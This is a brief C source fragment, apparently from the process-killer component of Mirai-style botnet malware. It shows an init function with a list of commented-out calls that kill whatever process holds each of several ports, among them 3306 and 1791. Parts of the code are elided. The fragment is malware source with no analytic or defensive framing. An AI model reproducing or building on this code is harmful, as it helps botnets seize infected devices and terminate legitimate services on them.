...
void killer_init(void)
{
    ...
    //killer_kill_by_port(htons(1791));
    //killer_kill_by_port(htons(48480));
    //killer_kill_by_port(htons(17813));
    //killer_kill_by_port(htons(1543));
    //killer_kill_by_port(htons(34129));
    //killer_kill_by_port(htons(1738));
    //killer_kill_by_port(htons(9506));
    //killer_kill_by_port(htons(9061));
    //killer_kill_by_port(htons(55));
    //killer_kill_by_port(htons(192));
    //killer_kill_by_port(htons(3306));
